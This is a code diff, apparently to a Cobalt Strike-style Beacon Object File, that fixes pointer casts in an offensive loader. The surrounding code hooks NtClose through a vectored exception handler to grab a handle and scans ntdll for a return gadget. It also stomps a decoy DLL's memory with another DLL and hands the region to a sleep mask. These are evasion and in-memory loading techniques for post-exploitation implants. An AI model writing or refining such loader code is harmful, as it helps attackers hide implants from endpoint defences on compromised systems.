@@ -111,8 +111,8 @@ LONG VectoredHandleree(PEXCEPTION_POINTERS ExceptionInfo) {
         if (ExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)NTDLL$NtClose) {
             if(g_SacData->Loaded) {
                 
-                g_SacData->pSacHandle = ExceptionInfo->ContextRecord->Rcx;
-                ExceptionInfo->ContextRecord->Rcx = NULL;
+                g_SacData->pSacHandle = (HANDLE)ExceptionInfo->ContextRecord->Rcx;
+                ExceptionInfo->ContextRecord->Rcx = 0;
                 MSVCRT$printf("[*] Got handle from NtClose : %p\n", g_SacData->pSacHandle);
                 ExceptionInfo->ContextRecord->EFlags &= ~0x100;
                 return EXCEPTION_CONTINUE_EXECUTION;
@@ -133,8 +133,8 @@ PVOID find_gadget_ret() {
     PIMAGE_NT_HEADERS NtDll = (PIMAGE_NT_HEADERS)((ULONG_PTR)hNt + ((PIMAGE_DOS_HEADER)hNt)->e_lfanew);
     PIMAGE_SECTION_HEADER scDll = IMAGE_FIRST_SECTION(NtDll);
     for (int i = 0; i < NtDll->FileHeader.NumberOfSections; i++) {
-        if (MSVCRT$strcmp(".text", scDll[i].Name) == 0) {
-            PBYTE txtBase = scDll[i].VirtualAddress + (ULONG_PTR)hNt;
+        if (MSVCRT$strcmp(".text", (const char*)scDll[i].Name) == 0) {
+            PBYTE txtBase = (PBYTE)((ULONG_PTR)hNt + scDll[i].VirtualAddress);
             DWORD sizee = scDll[i].Misc.VirtualSize;
 
             for (DWORD ii = 0; ii < sizee; ii++) {
@@ -234,7 +234,7 @@ void go ( )
     fn_RemoveVEH pRemoveVEH = (fn_RemoveVEH)GetProcAddress(hNtdll, "RtlRemoveVectoredExceptionHandler");
     pRemoveVEH(hVeh); // remove the VEH
 
-    PIMAGE_NT_HEADERS32 nt_hDecoy_dst = (ULONG_PTR)hDecoy_dst + ((PIMAGE_DOS_HEADER)hDecoy_dst)->e_lfanew;
+    PIMAGE_NT_HEADERS32 nt_hDecoy_dst = (PIMAGE_NT_HEADERS32)((ULONG_PTR)hDecoy_dst + ((PIMAGE_DOS_HEADER)hDecoy_dst)->e_lfanew);
     //checking if size is not a problem
 
     SIZE_T becSize = SizeOfDLL(&dll_data);
@@ -250,7 +250,7 @@ void go ( )
     for (int j = 0; j < nt_hDecoy_dst->FileHeader.NumberOfSections; j++) {
         DWORD oldp = 0;
         if(sc_hDecoy_dst[j].VirtualAddress && sc_hDecoy_dst[j].Misc.VirtualSize) {
-            PVOID psc_hDecoy_dst = ((ULONG_PTR)hDecoy_dst + (ULONG_PTR)sc_hDecoy_dst[j].VirtualAddress);
+            PVOID psc_hDecoy_dst = (PVOID)((ULONG_PTR)hDecoy_dst + (ULONG_PTR)sc_hDecoy_dst[j].VirtualAddress);
             if(!(KERNEL32$VirtualProtect(psc_hDecoy_dst, sc_hDecoy_dst[j].Misc.VirtualSize, PAGE_READWRITE, &oldp))) {
                 return;
             }
@@ -263,7 +263,7 @@ void go ( )
     LoadDLL ( &dll_data, dll_src, hDecoy_dst );
     SIZE_T old_size = SizeOfDLL ( &dll_data ); 
     /* track dll's memory */
-    PVOID new_base = (ULONG_PTR)hDecoy_dst + 0x1000;
+    PVOID new_base = (PVOID)((ULONG_PTR)hDecoy_dst + 0x1000);
     SIZE_T new_size =  old_size - 0x1000;
     //passing the new mem to pico for the sleep mask
     memory.Dll.BaseAddress = ( PVOID ) new_base;
